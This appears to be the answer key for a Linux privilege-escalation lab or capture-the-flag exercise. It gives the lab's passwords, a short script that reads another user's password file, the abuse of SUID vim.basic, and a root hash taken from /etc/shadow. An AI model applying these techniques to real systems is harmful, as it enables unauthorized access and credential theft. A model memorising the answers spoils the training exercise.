# Answer Key

1. What is the default shell for the *level0* user?

Found using `echo $0`:

```
-rbash
``` 

2. What was your final exploit script to get *level1* credentials?

There are multiple solutions to this problem. `password.backup` in 
`/home/level1/` contains the *level1* password that is only supposed to be
readable by *level1*. Moving `monitor.sh` to something else like `monitor.bak`
allows the *level0* user to `scp` a different `monitor.sh` script. Here is one
example that will output the password to `monitor.out`:

```
#!/bin/bash
cat /home/level1/password.backup
```

3. What are the *level1* credentials?

Found in `/home/level1/password.backup`:

```
ThisIsThePasswordForLevel1
```

4. What mistake did *level1* make?

*level1* attempted to SSH into the *level2* user using the `-p` flag as a
password instead of a desired port number. This is evident in 
`/home/level1/.bash_history`. 

5. What are the *level2* credentials?

Found in `/home/level1/.bash_history`

```
L3v3l2!
```

6. What program did you use to exploit an SUID bit?

```
vim.basic
```

7. What is the root password hash?

From `/etc/shadow`:

```
root:$6$4icRLxLE$ayqo41RNLRA0hrB4HhOg1JTHv9kk6DeQsfLvE8jqVSWiofOKRvBQO74QOpLeK9vho5BEZGJ7NJXftm7yI4xSF1:18015:0:99999:7:::
```
